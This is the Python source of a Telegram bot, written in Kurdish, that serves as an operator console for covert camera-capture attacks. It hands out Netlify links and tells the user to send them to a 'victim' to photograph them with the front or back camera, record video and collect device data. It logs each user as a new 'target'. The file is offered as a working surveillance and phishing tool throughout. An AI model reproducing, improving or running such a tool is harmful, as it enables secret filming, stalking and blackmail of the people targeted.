import os
import sys
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# تووکن لە ژینگەی سێرڤەرەوە دەخوێنرێتەوە (بۆ پاراستنی تەواو لە گیتهەب)
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# لینکەکانت
LINKS = {
    "front": "https://genuine-bublanina-6ef92a.netlify.app/",
    "back": "https://majestic-cannoli-a2db6b.netlify.app/",
    "video": "https://splendorous-toffee-5f8076.netlify.app",
    "all": "https://jolly-entremet-36bd78.netlify.app"
}

# تابلۆی پێشوازیکردنی شاهانە
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_name = user.first_name
    username = f"@{user.username}" if user.username else "N/A"
    user_id = user.id
    
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 🚨 New Target Connected -> Name: {user_name} | ID: {user_id} | Username: {username}")
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و کامێراکان:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "• ئاستی پارێزربی: `MILITARY-GRADE (NO TOKEN LEAK)`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکی هێرشبەر، کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_camera_menu"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# بەڕێوەبردنی کلیلی سیستەمەکان
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_camera_menu":
        bot.answer_callback_query(call.id, "فەرموو جۆری هێرشەکە هەڵبژێرە!")
        
        menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
        
        # لێرەدا callback_data دادەنێین نەک url، بۆ ئەوەی پەیامی تێدا بنێرین
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
            InlineKeyboardButton("📸 کامێرای پشتەوە", callback_data="link_back"),
            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", callback_data="link_video"),
            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", callback_data="link_all")
        )
        
        bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")

    # ناردنی لینکەکان بە شێوازی تێکست و کۆپی کردن
    elif call.data.startswith("link_"):
        key = call.data.split("_")[1]
        link = LINKS.get(key, "https://google.com")
        
        titles = {
            "front": "کامێرای پێشەوە",
            "back": "کامێرای پشتەوە",
            "video": "٨ چرکە ڤیدیۆ",
            "all": "هەمووی پێکەوە (Ultimate)"
        }
        
        target_name = titles.get(key, "لینک")
        
        bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
        
        # ڕستەی داواکراو لەگەڵ لینکی خاوێن بۆ کۆپی کردن
        response_text = (
            f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n"
            f"`{link}`\n\n"
            "👇 **پەنجە بنێ بە لینک بۆ کۆپی کردن**"
        )
        
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        about_msg = (
            "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ دروستکردن و دابەشکردنی لینکە هێرشبەرەکان. "
            "ئامانجی سەرەکی کۆکردنەوەی زانیارییە وردەکانی ئامێر و وێنەگرتن و ڤیدیۆتۆمارکردنی قوربانییە لە ڕێگەی کامێراکانەوە بە کوالێتی بەرز."
        )
        bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")

if __name__ == '__main__':
    print("==========================================")
    print("💀 SECURE TITANIUM OMEGA BOT INITIALIZED 💀")
    print("==========================================")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Connection Error Handled: {e}")
            time.sleep(3)
